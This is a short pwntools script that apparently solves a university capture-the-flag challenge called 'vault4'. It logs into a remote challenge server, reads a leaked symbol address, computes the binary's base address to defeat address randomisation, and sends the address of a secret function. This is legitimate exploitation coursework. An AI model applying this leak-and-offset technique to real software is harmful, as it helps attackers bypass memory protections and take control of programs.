from pwn import *

context.log_level = "info"

LOCAL = False
source_address_name = "fake_vault"
target_address_name = "secret_vault"

if LOCAL:
    p = process("./vault4")
    libc = "./vault4"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1234)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./vault4"

# Extract the given address from the message and read up until expected input
print(p.recvuntil(b"at: ").decode())
source_raw_address = p.recvline().strip()
print(p.recvuntil(b">").decode())
print(f"{source_address_name:<15} raw         : {source_raw_address}")
source_address = int.from_bytes(source_raw_address, byteorder="little")
print(f"{source_address_name:<15} address     : {hex(source_address)}")

# Open Shared library to get offset addresses
e = ELF(libc)

# Get source offset
source_address_offset = e.symbols[source_address_name]
print(f"{source_address_name:<15} offset      : {hex(source_address_offset)}")

# Compute the base address from the offset and the given address (base = address - offset)
base_address = source_address - source_address_offset
print(f"{'base address':<15}             : {hex(base_address)}")

# Get the offset for the target address
target_address_offset = e.symbols[target_address_name]
print(f"{target_address_name:<15} offset      : {hex(target_address_offset)}")

# Compute the target address (address = base + offset)
target_address = base_address + target_address_offset
print(f"{target_address_name:<15} address     : {hex(target_address)}")

# This challenge required raw bytes
target_address_raw = target_address.to_bytes((target_address.bit_length() + 7) // 4,
                                             byteorder='little')
print(f"{target_address_name:<15} address raw : {target_address_raw}")

# Send the answer
p.sendline(target_address_raw)

# Reap the rewards
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
